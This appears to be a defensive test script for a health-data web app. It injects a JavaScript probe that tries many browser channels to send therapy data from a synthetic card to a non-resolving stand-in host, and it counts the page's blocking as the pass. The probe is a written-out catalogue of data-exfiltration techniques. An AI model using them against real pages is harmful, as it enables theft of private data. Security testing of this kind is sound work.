"""A probe that tries to send data out of the page, every way it can think of.

    python3 dev/tests/page/make-escape-probe.py <repo root> <out dir>

The other checks ask whether PAPvault reaches the network. This one asks the harder
question: if something in the page did try, would it get out. `policy.py` guards what
the policy says; this guards what it does, which is not the same claim -- a policy can
read correctly and still not be enforced the way it is meant to be. It loads a synthetic
card so there is real card-derived data in memory, then attempts every outbound
mechanism in turn against a host that is not the one serving the page, and reports
what happened to each.

A refusal is the pass. `dev/tests/outbound.py` runs it under Chrome's --log-net-log
and asks both questions: the report says what the page believes happened, the network
log says what actually left.

Nothing here sends real data anywhere: the card is synthetic, the target host does
not resolve, and every attempt is expected to be stopped by the page's own policy
before a packet exists.
"""
import base64, hashlib, json, pathlib, sys

ROOT, OUT = pathlib.Path(sys.argv[1]), pathlib.Path(sys.argv[2])
OUT.mkdir(parents=True, exist_ok=True)
page = (ROOT / "dist/index.html").read_text(encoding="utf-8")
card = ROOT / "dev/synthetic/out/resmed/plain-night"
files = []
for path in sorted(card.rglob("*")):
    if path.is_file() and path.name != "answer.json":
        rel = "plain-night/" + str(path.relative_to(card)).replace("\\", "/")
        files.append((rel, base64.b64encode(path.read_bytes()).decode()))

probe = """
window.addEventListener("load", function () {
  var FILES = %s;
  var AWAY = "https://papvault-escape-test.invalid/collect";
  var report = { attempts: [], violations: [], errors: [] };

  document.addEventListener("securitypolicyviolation", function (e) {
    report.violations.push(e.effectiveDirective + " -> " + String(e.blockedURI).slice(0, 60));
  });
  window.addEventListener("error", function (e) { report.errors.push(String(e.message).slice(0, 80)); });

  function attempt(name, run) {
    try {
      var out = run();
      if (out && typeof out.then === "function") {
        out.then(function () { report.attempts.push([name, "RESOLVED"]); },
                 function (err) { report.attempts.push([name, "refused: " + String(err).slice(0, 70)]); });
        report.attempts.push([name, "pending"]);
      } else {
        report.attempts.push([name, "returned " + String(out).slice(0, 40)]);
      }
    } catch (err) {
      report.attempts.push([name, "threw: " + String(err).slice(0, 70)]);
    }
  }

  var transfer = new DataTransfer();
  FILES.forEach(function (spec) {
    var raw = atob(spec[1]);
    var bytes = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) { bytes[i] = raw.charCodeAt(i); }
    transfer.items.add(new File([bytes], spec[0]));
  });
  var input = document.getElementById("folder-input");
  input.files = transfer.files;
  input.dispatchEvent(new Event("change"));

  var tries = 0;
  (function ready() {
    if (++tries > 6000) { document.title = "GAVE UP"; return; }
    if (!document.querySelector("#plots-body .uplot")) { setTimeout(ready, 25); return; }

    // Something a card actually produced, so an attempt would be carrying real
    // therapy-shaped data rather than a constant.
    var carried = document.getElementById("summary-body").textContent.slice(0, 120);
    report.carrying = carried.slice(0, 40);

    attempt("fetch", function () { return fetch(AWAY, { method: "POST", body: carried }); });
    attempt("fetch no-cors", function () { return fetch(AWAY, { mode: "no-cors", method: "POST", body: carried }); });
    attempt("XMLHttpRequest", function () {
      var x = new XMLHttpRequest();
      x.open("POST", AWAY, true);
      x.send(carried);
      return "sent";
    });
    attempt("sendBeacon", function () { return navigator.sendBeacon(AWAY, carried); });
    attempt("WebSocket", function () { return new WebSocket("wss://papvault-escape-test.invalid/") && "opened"; });
    attempt("EventSource", function () { return new EventSource(AWAY) && "opened"; });
    attempt("Image src", function () {
      var img = new Image();
      img.src = AWAY + "?d=" + encodeURIComponent(carried);
      return "assigned";
    });
    attempt("script src", function () {
      var s = document.createElement("script");
      s.src = AWAY + "/x.js";
      document.head.appendChild(s);
      return "appended";
    });
    attempt("link prefetch", function () {
      var l = document.createElement("link");
      l.rel = "prefetch";
      l.href = AWAY;
      document.head.appendChild(l);
      return "appended";
    });
    attempt("iframe", function () {
      var f = document.createElement("iframe");
      f.src = AWAY;
      document.body.appendChild(f);
      return "appended";
    });
    attempt("form submit", function () {
      var f = document.createElement("form");
      f.method = "POST";
      f.action = AWAY;
      f.target = "_blank";
      document.body.appendChild(f);
      f.submit();
      return "submitted";
    });
    attempt("dynamic import", function () { return import(AWAY + "/m.js"); });
    attempt("eval", function () { return eval("1+1"); });
    attempt("new Function", function () { return new Function("return 1+1")(); });
    attempt("Worker", function () { return new Worker(AWAY + "/w.js") && "made"; });
    attempt("service worker", function () {
      return navigator.serviceWorker ? navigator.serviceWorker.register(AWAY + "/sw.js") : "no serviceWorker";
    });
    attempt("RTCPeerConnection", function () {
      return new RTCPeerConnection({ iceServers: [{ urls: "stun:papvault-escape-test.invalid" }] }) && "made";
    });
    attempt("CSS url()", function () {
      var d = document.createElement("div");
      d.style.backgroundImage = "url(" + AWAY + "/bg.png)";
      document.body.appendChild(d);
      return "styled";
    });

    setTimeout(function () {
      document.title = "ESCAPE " + JSON.stringify(report);
    }, 1500);
  })();
});
""" % json.dumps(files)

digest = base64.b64encode(hashlib.sha256(probe.encode()).digest()).decode()
text = page.replace("script-src ", "script-src 'sha256-%s' " % digest, 1)
text = text.replace("</body>", "<script>%s</script>\n</body>" % probe, 1)
(OUT / "escape.html").write_text(text, encoding="utf-8")
print("escape probe built from", hashlib.sha256((ROOT / "dist/index.html").read_bytes()).hexdigest())
